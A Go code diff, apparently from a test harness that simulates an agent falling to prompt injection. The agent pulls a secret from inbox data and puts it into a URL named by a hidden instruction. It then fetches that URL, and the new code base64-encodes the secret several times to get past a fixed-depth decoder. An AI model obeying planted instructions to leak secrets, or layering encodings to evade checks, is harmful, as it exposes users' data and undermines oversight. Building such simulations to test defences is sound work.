@@ -62,11 +62,21 @@ func Run(c Caller, task Task, log func(string)) {
 		secret := secretRe.FindString(inbox.Data)
 		u := strings.NewReplacer(
 			"{secret}", secret,
-			"{secret_b64}", base64.URLEncoding.EncodeToString([]byte(secret)),
+			"{secret_b64}", b64Times(secret, 1),
+			"{secret_b64x4}", b64Times(secret, 4),
 		).Replace(m[1])
 		log("agent: obeying hidden instruction, opening " + u)
 		call(c, log, "web_fetch", map[string]string{"url": u})
 	}
+}
+
+// b64Times base64-encodes s n times, the way an attacker layers encodings
+// to get past a decoder with a fixed depth.
+func b64Times(s string, n int) string {
+	for i := 0; i < n; i++ {
+		s = base64.URLEncoding.EncodeToString([]byte(s))
+	}
+	return s
 }
 
 func call(c Caller, log func(string), tool string, args map[string]string) {
